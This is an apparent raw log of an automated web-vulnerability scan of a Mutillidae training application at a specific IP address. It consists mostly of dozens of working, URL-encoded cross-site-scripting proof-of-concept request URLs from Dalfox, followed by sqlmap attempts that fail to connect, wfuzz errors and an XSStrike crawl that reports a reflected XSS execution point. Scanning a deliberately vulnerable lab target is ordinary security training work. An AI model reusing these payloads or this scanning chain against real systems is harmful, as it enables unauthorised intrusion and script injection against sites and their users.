-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.paypal.com%2Fcgi-bin%2Fwebscr=%26%2339%3B%26gt%3B%26lt%3Bembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%26gt%3B%26lt%3B%2Fembed%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?host=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2573%2574%2561%2572%2574%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&rurl=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2574%2569%256D%2565%2575%2570%2564%2561%2574%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?key=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2564%2575%2572%2561%2574%2569%256F%256E%2563%2568%2561%256E%2567%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dprivilege-escalation.php=%2527%253E%253C%2573%2576%2567%253E%253C%2566%256F%2572%2565%2569%2567%256E%254F%2562%256A%2565%2563%2574%253E%253C%2569%256D%2567%2520%2573%2572%2563%253D%2578%2520%256F%256E%2565%2572%2572%256F%2572%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%2566%256F%2572%2565%2569%2567%256E%254F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dcapture-data.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+ondragend%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Cslot+onslotchange%3Dconsole.warn%281%29+class%3Ddalfox%3E%3C%2Fslot%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?name=%26gt%3B%26lt%3Blink+rel%3Dprefetch+href%3D%2F%2Fevil.com+onload%3Dalert%281%29+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dframer.html=%253E%253C%2566%256F%2572%256D%253E%253C%2562%2575%2574%2574%256F%256E%2520%2566%256F%2572%256D%2561%2563%2574%2569%256F%256E%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%2574%2565%2573%2574%253C%252F%2562%2575%2574%2574%256F%256E%253E%253C%252F%2566%256F%2572%256D%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&return=%26%2334%3B%26gt%3B%26lt%3Bsvg+onload%3D%26%2334%3Bnavigator.serviceWorker%26amp%3B%26amp%3Balert%281%29%26%2334%3B+class%3Ddalfox%26gt%3B[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A8-Cross-Site_Request_Forgery_%2528CSRF%2529=%253E%253C%2573%2576%2567%253E%253C%2575%2573%2565%2520%2568%2572%2565%2566%253D%2564%2561%2574%2561%253A%2569%256D%2561%2567%2565%252F%2573%2576%2567%252B%2578%256D%256C%252C%253C%2573%2576%2567%2520%2569%2564%253D%2527%2578%2527%2520%2578%256D%256C%256E%2573%253D%2527%2568%2574%2574%2570%253A%252F%252F%2577%2577%2577%252E%2577%2533%252E%256F%2572%2567%252F%2532%2530%2530%2530%252F%2573%2576%2567%2527%2520%256F%256E%256C%256F%2561%2564%253D%2527%2561%256C%2565%2572%2574%2528%2531%2529%2527%253E%253C%252F%2573%2576%2567%253E%2523%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?image_url=%2527%253E%253C%2573%2576%2567%252F%256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?http%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2010-A7=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2563%256F%256E%2574%2565%2578%2574%256D%2565%256E%2575%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A10-Unvalidated_Redirects_and_Forwards=%253E%253C%256D%2561%2572%2571%2575%2565%2565%2520%256F%256E%2573%2574%2561%2572%2574%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256D%2561%2572%2571%2575%2565%2565%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?l=%2527%253E%253C%256D%2561%2572%2571%2575%2565%2565%2520%256F%256E%2573%2574%2561%2572%2574%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256D%2561%2572%2571%2575%2565%2565%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?framer.html=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onplaying%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fwebservices%2Fsoap%2Fws-hello-world.php=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%2566%2572%2561%256D%2565%2573%255B%2530%255D%252E%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Darbitrary-file-inclusion.php=%22%3E%3Cimg+src%3Dx+onerror%3D%22requestAnimationFrame%28%28%29%3D%3Ealert%281%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?%3Fpage%3Dadd-to-your-blog.php=%22%3E%3CIMG+SRC%3Dx+onpaste%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ctemplate+onload%3Dprompt%281%29+class%3Ddalfox%3E%3C%2Ftemplate%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dclient-side-comments.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+oncontextmenu%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A9-Using_Components_with_Known_Vulnerabilities=%253E%253C%2574%2565%2578%2574%2561%2572%2565%2561%2520%256F%256E%2566%256F%2563%2575%2573%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2561%2575%2574%256F%2566%256F%2563%2575%2573%253E%253C%252F%2574%2565%2578%2574%2561%2572%2565%2561%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?api=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2565%2564%256D%2565%2574%2561%2564%2561%2574%2561%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?email=%253E%253C%256D%2565%2574%2561%2520%2568%2574%2574%2570%252D%2565%2571%2575%2569%2576%253D%2572%2565%2566%2572%2565%2573%2568%2520%2563%256F%256E%2574%2565%256E%2574%253D%2530%253B%2575%2572%256C%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?domain=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2565%2564%256D%2565%2574%2561%2564%2561%2574%2561%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?data=%22%3E%3Csvg+onload%3D%22top.alert%281%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?data=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%256E%2561%2576%2569%2567%2561%2574%256F%2572%252E%2573%2565%2572%2576%2569%2563%2565%2557%256F%2572%256B%2565%2572%2526%2526%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3CScRipt%3Econsole.error%281%29%3C%2Fscript%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&token=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ccanvas+onwebglcontextlost%3Dprint%281%29+class%3Ddalfox%3E%3C%2Fcanvas%3E[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Cdiv+onpointerrawupdate%3Dprompt%281%29+class%3Ddalfox%3E%3C%2Fdiv%3E[0m
-[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%27%3E%3Cdetails+open+ontoggle%3Dalert%281%29%3E%3C%2Fdetails%3E[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ccanvas+onwebglcontextlost%3Dconfirm.call%28%29%281%29+class%3Ddalfox%3E%3C%2Fcanvas%3E[0m
-[95m[POC][V][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dconsole.log%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&username=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2577%2568%2565%2565%256C%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E[0m
-[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%3E%3Cobject+data%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E%3C%2Fobject%3E[0m
-[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E[0m
-[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%27%3E%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E[0m
-[95m[POC][V][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%22%3E%3CIMG+SRC%3Dx+onsearch%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
-
-
-[GF+qsreplace] http://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php?pagename=php-errors.php
-http://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php?pagename=PAYLOAD
-
-[GF+qsreplace] https://128.198.49.198:8102/mutillidae/index.php?username=anonymous
-https://128.198.49.198:8102/mutillidae/index.php?username=PAYLOAD
-
-
-[SQLI - detect] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
-        ___
-       __H__
- ___ ___[.]_____ ___ ___  {1.9.10.5#dev}
-|_ -| . [)]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 05:35:37 /2025-10-22/
-
-[05:35:37] [WARNING] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap' as the output directory
-[05:35:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
-[1/1] URL:
-GET http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
-do you want to test this URL? [Y/n/q]
-> Y
-[05:35:37] [INFO] testing URL 'http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php'
-[05:35:37] [INFO] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0535am.csv' as the CSV results file in multiple targets mode
-[05:35:37] [INFO] testing connection to the target URL
-got a refresh intent (redirect like response common to login pages) to 'javascript:alert(1) class=dalfox'. Do you want to apply it from now on? [Y/n] Y
-[05:35:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
-[05:35:46] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with proxy switches ('--proxy', '--proxy-file'...)
-[05:35:46] [ERROR] unable to connect to the target URL, skipping to the next target
-[05:35:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0535am.csv'
-
-[*] ending @ 05:35:46 /2025-10-22/
-
-
-
-[SQLI - detect] https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.9.10.5#dev}
-|_ -| . [.]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 05:35:46 /2025-10-22/
-
-[05:35:46] [WARNING] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap' as the output directory
-[05:35:46] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
-[1/1] URL:
-GET https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl
-do you want to test this URL? [Y/n/q]
-> Y
-[05:35:46] [INFO] testing URL 'https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl'
-[05:35:46] [INFO] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0535am.csv' as the CSV results file in multiple targets mode
-[05:35:46] [INFO] testing connection to the target URL
-[05:35:47] [ERROR] can't establish SSL connection, skipping to the next target
-[05:35:47] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0535am.csv'
-
-[*] ending @ 05:35:47 /2025-10-22/
-
-
-
-[SQLI - TIMEOUT] http://128.198.49.198:8102/mutillidae/index.php?popUpNotificationCode=SSLE1
-
-[SQLI - TIMEOUT] http://128.198.49.198:8102/mutillidae/hints-page-wrapper.php?level1HintIncludeFile=11
-
-[SQLI - TIMEOUT] http://128.198.49.198:8102/mutillidae/webservices/soap/ws-lookup-dns-record.php?wsdl=
-
-[SQLI - TIMEOUT] http://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php?pagename=php-errors.php
-
-[SQLI - TIMEOUT] http://128.198.49.198:8102/mutillidae/index.php?PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php
-
-[SQLI - TIMEOUT] http://128.198.49.198:8102/mutillidae/index.php?iv=6bc24fc1ab650b25b4114e93a98f1eba
-
-[SQLI - detect] https://128.198.49.198:8102/mutillidae/index.php?username=anonymous
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.9.10.5#dev}
-|_ -| . [']     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 05:53:48 /2025-10-22/
-
-[05:53:48] [WARNING] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap' as the output directory
-[05:53:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
-[1/1] URL:
-GET https://128.198.49.198:8102/mutillidae/index.php?username=anonymous
-do you want to test this URL? [Y/n/q]
-> Y
-[05:53:49] [INFO] testing URL 'https://128.198.49.198:8102/mutillidae/index.php?username=anonymous'
-[05:53:49] [INFO] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0553am.csv' as the CSV results file in multiple targets mode
-[05:53:49] [INFO] testing connection to the target URL
-[05:53:50] [ERROR] can't establish SSL connection, skipping to the next target
-[05:53:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0553am.csv'
-
-[*] ending @ 05:53:50 /2025-10-22/
-
-
-
-[SQLI - detect] https://128.198.49.198:8102/mutillidae/index.php?page-to-frame=styling.php?page-title=Styling with Mutillidae
-        ___
-       __H__
- ___ ___["]_____ ___ ___  {1.9.10.5#dev}
-|_ -| . [,]     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 05:53:52 /2025-10-22/
-
-[05:53:52] [WARNING] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap' as the output directory
-[05:53:52] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15' from file '/opt/sqlmap/data/txt/user-agents.txt'
-[1/1] URL:
-GET https://128.198.49.198:8102/mutillidae/index.php?page-to-frame=styling.php?page-title=Styling with Mutillidae
-do you want to test this URL? [Y/n/q]
-> Y
-[05:53:52] [INFO] testing URL 'https://128.198.49.198:8102/mutillidae/index.php?page-to-frame=styling.php?page-title=Styling with Mutillidae'
-[05:53:52] [INFO] using '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0553am.csv' as the CSV results file in multiple targets mode
-[05:53:52] [INFO] testing connection to the target URL
-[05:53:53] [ERROR] can't establish SSL connection, skipping to the next target
-[05:53:53] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/128.198.49.198:8102_mutillidae_20251022_034231/sqlmap/results-10222025_0553am.csv'
-
-[*] ending @ 05:53:53 /2025-10-22/
-
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/index.php?popUpNotificationCode=SSLE1
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/hints-page-wrapper.php?level1HintIncludeFile=11
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/webservices/soap/ws-lookup-dns-record.php?wsdl=
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php?pagename=php-errors.php
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/index.php?PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] http://128.198.49.198:8102/mutillidae/index.php?iv=6bc24fc1ab650b25b4114e93a98f1eba
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] https://128.198.49.198:8102/mutillidae/index.php?username=anonymous
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[WFUZZ] https://128.198.49.198:8102/mutillidae/index.php?page-to-frame=styling.php?page-title=Styling with Mutillidae
- /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
-default
-default
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing mutillidae/index.php?page=show-log.php   [0m[!!] Unable to connect to the target. [0m
-[92m[+][0m Potentially vulnerable objects found at http://128.198.49.198:8102/mutillidae/index.php [0m
-[91m------------------------------------------------------------[0m
-1464 						<td ReflectedXSSExecutionPoint="1">User visited: "><img src=x onerror="[91msetTimeout[0m('alert(1)',1)" class=dalfox></td>[91m------------------------------------------------------------[0m
-[97m[~][0m Parsing php?page=secret-administrative-pages.php [0m[97m[~][0m Parsing index.php?page=framer.html               [0m[97m[~][0m Parsing hp?page=documentation/setting-up-ssl.php [0m[97m[~][0m Parsing ./webservices/soap/ws-user-account.php   [0m[97m[~][0m Parsing index.php?page=user-poll.php             [0m[97m[~][0m Parsing index.php?page=add-to-your-blog.php      [0m[97m[~][0m Parsing index.php?page=directory-browsing.php    [0m[97m[~][0m Parsing index.php?page=user-info-xpath.php       [0m[97m[~][0m Parsing .php&iv=6bc24fc1ab650b25b4114e93a98f1eba [0m[97m[~][0m Parsing ndex.php?page=back-button-discussion.php [0m[97m[~][0m Parsing index.php?page=user-info.php             [0m[97m[~][0m Parsing index.php?page=login.php                 [0m[97m[~][0m Parsing index.php?page=view-someones-blog.php    [0m[97m[~][0m Parsing ./webservices/soap/ws-hello-world.php    [0m[97m[~][0m Parsing index.php?page=captured-data.php         [0m[97m[~][0m Parsing framer.html                              [0m[97m[~][0m Parsing text-generator.php?pagename=show-log.php [0m[97m[~][0m Parsing index.php?page=phpinfo.php               [0m[97m[~][0m Parsing ?page=source-viewer.php                  [0m[97m[~][0m Parsing index.php?page=client-side-comments.php  [0m[97m[~][0m Parsing ?page=credits.php                        [0m[97m[~][0m Parsing page=home.php&popUpNotificationCode=HPH0 [0m[97m[~][0m Parsing index.php?page=robots-txt.php            [0m[97m[~][0m Parsing ?page=text-file-viewer.php               [0m[97m[~][0m Parsing set-up-database.php                      [0m[97m[~][0m Parsing index.php?page=phpmyadmin.php            [0m[97m[~][0m Parsing index.php?page=installation.php          [0m[97m[~][0m Parsing index.php                                [0m[97m[~][0m Parsing age-wrapper.php?level1HintIncludeFile=55 [0m[97m[~][0m Parsing p?page=documentation/vulnerabilities.php [0m[97m[~][0m Parsing ?page=show-log.php                       [0m[97m[~][0m Parsing index.php?page=framing.php               [0m[97m[~][0m Parsing php?do=toggle-security&page=show-log.php [0m[97m[~][0m Parsing index.php?page=privilege-escalation.php  [0m[97m[~][0m Parsing x.php?page=pen-test-tool-lookup-ajax.php [0m[97m[~][0m Parsing index.php?page=pen-test-tool-lookup.php  [0m[97m[~][0m Parsing ?do=toggle-enforce-ssl&page=show-log.php [0m[97m[~][0m Parsing index.php?page=ssl-misconfiguration.php  [0m[97m[~][0m Parsing assword-generator.php&username=anonymous [0m[97m[~][0m Parsing ./webservices/rest/ws-user-account.php   [0m[97m[~][0m Parsing index.php?page=html5-storage.php         [0m[97m[~][0m Parsing ex.php?page=arbitrary-file-inclusion.php [0m[97m[~][0m Parsing ebservices/soap/ws-lookup-dns-record.php [0m[97m[~][0m Parsing index.php?page=cache-control.php         [0m[97m[~][0m Parsing index.php?page=source-viewer.php         [0m[97m[~][0m Parsing index.php?page=repeater.php              [0m[97m[~][0m Parsing index.php?page=credits.php               [0m[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m